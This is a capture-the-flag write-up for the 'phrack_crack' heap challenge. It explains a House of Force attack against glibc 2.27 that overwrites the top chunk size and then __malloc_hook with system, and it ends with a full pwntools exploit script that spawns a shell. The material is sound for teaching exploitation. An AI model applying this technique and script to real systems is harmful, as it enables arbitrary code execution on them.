# phrack_crack

Author: [d1g174l_f0rtr355](https://twitter.com/BhaskaraShravya)

Solves: 9

Difficulty: Hard

## Preliminary Analysis

We notice that the binary given to us is a 64 bit non-stripped file with the following memory protections:

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x3fe000)
    RUNPATH:  b'./libc'

```
We notice that a libc has also been provided. You may choose to patch the binary to the libc given. With only PIE enabled, we cannot formulate the exploit technique at first glance. So let's get an understanding of the binary.

 ```
 GNU C Library (GNU libc) stable release version 2.27.
Copyright (C) 2018 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.
There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A
PARTICULAR PURPOSE.
Compiled by GNU CC version 7.5.0.
libc ABIs: UNIQUE IFUNC
For bug reporting instructions, please see:
<http://www.gnu.org/software/libc/bugs.html>.
```
Another important detail we need to notice is that the libc version provided to us is Glibc 2.27. 

## Understanding the binary

As we run the program, we see that we are presented with four choices: 
```
1. malloc 0/4
2. edit
3. target
4. quit
```
We can allocate atmost 4 chunks on the heap. Also we notice two generous leaks given to us. One leak being the libc addres sof puts and the other a heap address as seen from the decompiled code below:
```
  printf("Here's a generous leak for you! %p\n\n", &puts);
  idx = 0;
  ptr = malloc(0x88uLL);
  printf("Here's one more generous leak for you: %p\n", (char *)ptr - 64);
  free(ptr);
  while ( 1 )
  {
    printf("\nMENU\n\n1. malloc %u/%u\n", (unsigned int)idx, 4LL);
```

Upon further decompilation of the binary, we observe that when we try to malloc() a chunk, we are asked for size and data. However the code snippet below shows that there is no check on the size of the chunk. This enables us to give a very large sized chunk evetually resulting in a Hous of Force attack since the libc version given is also 2.27. 
```
        case 1:
          fflush(stdout);
          if ( idx < 0 )
          {
            puts("No negative indices allowed!");
            exit(0);
          }
          if ( idx > 4 )
          {
            puts("maximum requests reached!");
            exit(0);
          }
          puts("Enter size: ");
          __isoc99_scanf("%ld", &size);
          m_array[idx] = malloc(size);
          if ( !m_array[idx] )
          {
            puts("request failed!\n");
            exit(0);
          }
          puts("data: ");
          get_inp(m_array[idx++], (unsigned int)size);
          break;
 ```
 The edit() function asks for index at which we need to edit the chunk, and checks if the index is between 0-4. 
 
 ## Exploitation
 
 Since there is no size check on any of the chunks, we can make use of this vulnerability to overwrite the top chunk. Furthermore, we can request a chunk of a suitable large size. Generally, our memory map looks something like this:
![Screenshot from 2022-12-16 16-17-50](https://user-images.githubusercontent.com/59280388/208084571-f2b1d4ce-9aa6-498c-b686-71822e3d0380.png)

In the above image, the binary/ code_base addresses reside at the lowest address and the stack resides at the highest address. 

Now think!

If we overwrote the top chunk size field, then from malloc's perspective, the heap could extend across the gap overlapping sensitive data in the library or the stack region. However, we see that the `target` variable resides in the data section of the binary which is at a lower address than the heap. Look at the diagram below!

![Screenshot from 2022-12-16 16-19-09](https://user-images.githubusercontent.com/59280388/208087361-eb33359d-b1b2-4bcf-b750-cf1a6faf823c.png)


Hence, if we overwrote a really large value into the top chunk size field, it would appear as though it extended past the virtual address space, wrapping around to the start of the memory map. Then we can make another request for malloc, overwrite the `target` variable in the data section. However, upon a little closer observation, we realize that overwriting the `target` address is eventually of no significance to us in trying to obtaina shell. Hence we shall make use the above same concept to overwrite `__malloc_hook`, with a pointer to system. Since `__malloc_hook` is internally called when trying to allocate a chunk through `malloc`, we see that when we try to request another chunk, `system()` will infact be executed. All we need to make sure is to place the string `/bin/sh` onto the heap. This is the concept behind the House of Force attack in the binary.

 
## Exploit
```
def malloc(size, data):
	p.sendline(b'1')
	p.sendlineafter(b'Enter size: \n', str(size))
	p.sendlineafter(b'data: \n', data)

def edit(ind, data):
	p.sendline(b'2')
	p.sendlineafter(b'Enter index: \n', str(ind))
	p.sendlineafter(b'data: \n', data)
  
from pwn import *

p = process('./phrack_crack')
gdb.attach(p)

p.recvuntil('! ')
libc = int(p.recvline()[:-1], 16)

info('libc: %s'%hex(libc))

p.recvuntil("Here's one more generous leak for you: ")
heap = int(p.recvline()[:-1], 16) - 0x630

info('heap: %s'%hex(heap))

# malloc
malloc(24, b'a'*20)

edit(0, b'b'*24 + p64(0xffffffffffffffff))

libc_base = libc - 0x6dba0
malloc_hook = libc_base + 0x3aec30
system = libc_base + 0x41710
binsh = libc_base + 0x175e93


dist = (malloc_hook - 0x10) - (heap + 0x1710 + 0x20)
info('dist: %s'%hex(dist))
malloc(dist, b'c')

malloc(30, p64(system))
p.sendline(b'1')
p.sendlineafter(b'Enter size: \n', str(binsh))

p.interactive()
```
 
 
